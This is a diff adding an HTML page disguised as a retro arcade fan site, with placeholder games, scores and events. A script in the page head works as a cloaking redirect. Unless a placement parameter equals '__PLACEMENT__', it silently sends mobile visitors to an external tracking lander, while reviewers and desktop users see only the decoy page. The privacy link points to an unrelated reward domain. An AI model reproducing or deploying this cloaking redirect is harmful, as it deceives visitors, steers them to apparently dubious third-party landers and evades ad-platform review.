@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/dade2563-43ce-4351-9ba3-22961c539221?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Neon Retro Arcade</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background-color: #000;
+            color: #0f0;
+            margin: 0;
+            padding: 0;
+            display: grid;
+            grid-template-columns: 1fr 2fr 1fr;
+            grid-template-rows: auto 1fr auto;
+            min-height: 100vh;
+        }
+        header {
+            grid-column: 1 / -1;
+            background-color: #800080;
+            padding: 20px;
+            text-align: center;
+        }
+        main {
+            grid-column: 2 / 3;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+        }
+        aside {
+            background-color: #008080;
+            padding: 20px;
+        }
+        footer {
+            grid-column: 1 / -1;
+            background-color: #800080;
+            padding: 10px;
+            text-align: center;
+        }
+        h1 {
+            font-size: 3em;
+            text-shadow: 0 0 10px #f0f;
+        }
+        .game-list {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-around;
+        }
+        .game-item {
+            background-color: #404;
+            border: 2px solid #0ff;
+            border-radius: 10px;
+            margin: 10px;
+            padding: 15px;
+            text-align: center;
+        }
+        a {
+            color: #ff0;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Neon Retro Arcade</h1>
+    </header>
+    <aside style="grid-column: 1 / 2; grid-row: 2 / 3;">
+        <h2>High Scores</h2>
+        <ol>
+            <li>PAC - 999,999</li>
+            <li>AST - 888,888</li>
+            <li>GLD - 777,777</li>
+        </ol>
+    </aside>
+    <main>
+        <h2>Featured Games</h2>
+        <div class="game-list">
+            <div class="game-item">
+                <h3>Space Invaders</h3>
+                <p>Defend Earth from alien invasion!</p>
+            </div>
+            <div class="game-item">
+                <h3>Pac-Man</h3>
+                <p>Gobble dots and avoid ghosts!</p>
+            </div>
+            <div class="game-item">
+                <h3>Asteroids</h3>
+                <p>Blast space rocks in this classic shooter!</p>
+            </div>
+        </div>
+    </main>
+    <aside style="grid-column: 3 / 4; grid-row: 2 / 3;">
+        <h2>Upcoming Events</h2>
+        <ul>
+            <li>Retro Gaming Night - Friday 8PM</li>
+            <li>Tournament: Galaga - Saturday 2PM</li>
+            <li>80s Costume Contest - Sunday 3PM</li>
+        </ul>
+    </aside>
+    <footer>
+        <p>&copy; 2023 Neon Retro Arcade | <a href="https://tokreward.com/privacy.html">Privacy Policy</a></p>
+    </footer>
+</body>
+</html>
